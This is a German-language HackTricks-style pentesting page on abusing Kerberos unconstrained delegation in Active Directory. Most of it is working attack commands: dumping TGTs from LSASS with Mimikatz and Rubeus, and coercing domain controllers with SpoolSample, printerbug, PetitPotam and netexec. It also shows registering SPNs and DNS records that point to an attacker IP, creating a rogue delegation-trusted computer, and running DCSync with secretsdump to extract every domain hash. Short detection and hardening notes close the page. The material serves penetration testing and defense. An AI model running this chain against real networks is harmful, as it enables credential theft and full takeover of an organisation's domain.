# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Dies ist eine Funktion, die ein Domain Administrator für jeden **Computer** innerhalb der Domäne aktivieren kann. Wenn sich anschließend ein **Benutzer anmeldet** auf dem Computer, wird eine **Kopie des TGT** dieses Benutzers innerhalb des vom DC bereitgestellten **TGS gesendet** und im Speicher in **LSASS gespeichert**. Wenn du also Administratorrechte auf dem Computer hast, kannst du die **Tickets dumpen und die Benutzer impersonaten** auf jedem Computer.

Wenn sich also ein Domain Admin auf einem Computer mit aktivierter Funktion "Unconstrained Delegation" anmeldet und du lokale Administratorrechte auf diesem Computer hast, kannst du das Ticket dumpen und den Domain Admin überall impersonaten (domain privesc).

Du kannst **Computerobjekte mit diesem Attribut finden**, indem du überprüfst, ob das Attribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) enthält. Dies kannst du mit dem LDAP-Filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ tun, den auch powerview verwendet:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Lade das Ticket des Administrators (oder des Opferbenutzers) mit **Mimikatz** oder **Rubeus für einen** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Weitere Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Weitere Informationen über Unconstrained delegation bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Authentifizierung erzwingen**

Wenn ein Angreifer einen **Computer kompromittieren kann, der für "Unconstrained Delegation" zugelassen ist**, könnte er einen **Print server** dazu **bringen**, sich **automatisch** bei diesem Computer **anzumelden**, wodurch ein **TGT** im Speicher des Servers gespeichert wird.\
Anschließend könnte der Angreifer einen **Pass the Ticket-Angriff durchführen, um** den Benutzer des Computerkontos des Print servers **zu imitieren**.

Um einen Print server dazu zu bringen, sich bei einem beliebigen Computer anzumelden, kannst du [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Wenn der TGT von einem Domain Controller stammt, kannst du einen [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) durchführen und alle Hashes vom DC erhalten.\
[**Weitere Informationen zu diesem Angriff bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Hier findest du weitere Möglichkeiten, eine **Authentifizierung zu erzwingen:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Jede andere Coercion-Primitiv, die das Opfer dazu bringt, sich per **Kerberos** bei deinem Host mit unconstrained delegation zu authentifizieren, funktioniert ebenfalls. In modernen Umgebungen bedeutet das häufig, den klassischen PrinterBug-Flow durch **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** oder eine auf **WebClient/WebDAV** basierende Coercion zu ersetzen, abhängig davon, welche RPC-Oberfläche erreichbar ist.

### Missbrauch eines Benutzer-/Servicekontos mit unconstrained delegation

Unconstrained delegation ist **nicht auf Computerobjekte beschränkt**. Auch ein **Benutzer-/Servicekonto** kann als `TRUSTED_FOR_DELEGATION` konfiguriert werden. In diesem Szenario besteht die praktische Voraussetzung darin, dass das Konto Kerberos-Service-Tickets für einen **SPN, den es besitzt**, empfangen muss.

Dies führt zu 2 sehr häufigen offensiven Wegen:

1. Du kompromittierst das Passwort/den Hash des **Benutzerkontos** mit unconstrained delegation und fügst anschließend diesem Konto einen **SPN** hinzu.
2. Das Konto besitzt bereits einen oder mehrere SPNs, aber einer davon verweist auf einen **veralteten/außer Betrieb genommenen Hostnamen**; das erneute Erstellen des fehlenden **DNS-A-Datensatzes** reicht aus, um den Authentifizierungs-Flow zu hijacken, ohne den SPN-Satz zu ändern.<sup>[[8]](#references)</sup>

Minimaler Linux-Flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Hinweise:

- Dies ist besonders nützlich, wenn der Unconstrained-Delegation-Principal ein **service account** ist und du nur dessen Credentials, aber keine Codeausführung auf einem verknüpften Host hast.
- Wenn der Zielbenutzer bereits über einen **stale SPN** verfügt, kann das erneute Erstellen des entsprechenden **DNS record** weniger auffällig sein, als einen neuen SPN in AD zu schreiben.
- Aktuelle Linux-zentrierte Tradecraft verwendet `addspn.py`, `dnstool.py`, `krbrelayx.py` und eine Coercion-Primitive; du musst keinen Windows-Host berühren, um die Kette abzuschließen.

### Abusing Unconstrained Delegation mit einem vom Angreifer erstellten Computer

Moderne Domains haben häufig `MachineAccountQuota > 0` (standardmäßig 10), wodurch jeder authentifizierte Principal bis zu N Computerobjekte erstellen kann. Wenn du außerdem über das Token-Privileg `SeEnableDelegationPrivilege` (oder gleichwertige Rechte) verfügst, kannst du den neu erstellten Computer so konfigurieren, dass ihm Unconstrained Delegation vertraut wird, und eingehende TGTs von privilegierten Systemen abfangen.<sup>[[1]](#references)</sup>

Ablauf auf hoher Ebene:

1) Einen Computer erstellen, den du kontrollierst
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Den gefälschten Hostnamen innerhalb der Domäne auflösbar machen
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Unconstrained Delegation auf dem vom Angreifer kontrollierten Computer aktivieren
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Warum das funktioniert: Bei unconstrained delegation cached die LSA auf einem für Delegation aktivierten Computer eingehende TGTs. Wenn du einen DC oder privilegierten Server dazu bringst, sich bei deinem Fake-Host zu authentifizieren, wird dessen Maschinen-TGT gespeichert und kann exportiert werden.

4) Starte krbrelayx im export mode und bereite das Kerberos-Material vor
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Authentifizierung vom DC/den Servern zu deinem Fake-Host erzwingen
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx speichert ccache-Dateien, wenn sich ein Computer authentifiziert, zum Beispiel:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Verwende das erfasste TGT des DC-Computers, um DCSync durchzuführen
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` ermöglicht die Erstellung von Computerkonten ohne besondere Berechtigungen; andernfalls benötigen Sie explizite Rechte.
- Das Setzen von `TRUSTED_FOR_DELEGATION` auf einem Computer erfordert `SeEnableDelegationPrivilege` (oder Domain-Admin-Rechte).
- Stellen Sie die Namensauflösung für Ihren gefälschten Host sicher (DNS-A-Record), damit der DC ihn über den FQDN erreichen kann.
- Für Coercion ist ein geeigneter Vektor erforderlich (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN usw.). Deaktivieren Sie diese nach Möglichkeit auf DCs.
- Wenn das Opferkonto als **„Account is sensitive and cannot be delegated“** markiert ist oder Mitglied von **Protected Users** ist, wird das weitergeleitete TGT nicht in das Service-Ticket aufgenommen. Daher liefert diese Kette kein wiederverwendbares TGT.<sup>[[9]](#references)</sup>
- Wenn **Credential Guard** auf dem authentifizierenden Client/Server aktiviert ist, blockiert Windows **Kerberos unconstrained delegation**, wodurch ansonsten gültige Coercion-Pfade aus Sicht des Operators fehlschlagen können.

Erkennungs- und Hardening-Ideen:

- Lösen Sie bei Event ID 4741 (Computerkonto erstellt) und 4742/4738 (Computer-/Benutzerkonto geändert) einen Alarm aus, wenn `TRUSTED_FOR_DELEGATION` in der UAC gesetzt wird.
- Überwachen Sie ungewöhnliche DNS-A-Record-Erstellungen in der Domain-Zone.
- Achten Sie auf Spitzen bei 4768/4769 von unerwarteten Hosts sowie auf DC-Authentifizierungen zu Nicht-DC-Hosts.
- Beschränken Sie `SeEnableDelegationPrivilege` auf eine minimale Gruppe, setzen Sie `MachineAccountQuota=0`, wo dies möglich ist, und deaktivieren Sie den Print Spooler auf DCs. Erzwingen Sie LDAP signing und channel binding.

### Maßnahmen

- Beschränken Sie DA-/Admin-Anmeldungen auf bestimmte Services.
- Setzen Sie für privilegierte Konten „Account is sensitive and cannot be delegated“.

## Referenzen

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
